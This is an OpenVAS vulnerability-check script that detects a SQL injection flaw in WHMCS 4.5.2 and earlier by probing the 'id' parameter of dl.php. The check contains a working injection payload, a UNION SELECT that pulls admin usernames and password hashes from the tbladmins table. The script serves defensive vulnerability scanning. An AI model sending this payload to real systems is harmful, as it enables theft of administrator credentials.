###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_whmcs_sql_inj_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# WHMCS SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803197");
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-05-14 11:27:14 +0530 (Tue, 14 May 2013)");
  script_name("WHMCS SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121613");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/whmcs-452-sql-injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Flaw is due to improper sanitation of user supplied input via the 'id'
  parameter to '/whmcs/dl.php' script.");
  script_tag(name:"solution", value:"Upgrade to WHMCS 5.2 or later.");
  script_tag(name:"summary", value:"This host is installed with WHMCS and is prone to sql injection
  vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to disclose credentials
  or manipulate SQL queries by injecting arbitrary SQL code.");
  script_tag(name:"affected", value:"WHMCS version 4.5.2 and prior");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/whmcs", "/bill", "/support", "/management", cgi_dirs(port:port)))
{

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"), port:port);

  if(">WHMCompleteSolution<" >< rcvRes && "http://www.whmcs.com/" >< rcvRes)
  {

    url = dir + "/dl.php?type=i&amp;id=1 and 0x0=0x1 union select 1,2,3,4," +
          "CONCAT(username,0x3a3a3a,password),6,7 from tbladmins --";

    if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern:"filename=*.pdf", extra_check:make_list('CreationDate',
       'ViewerPreferences')))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);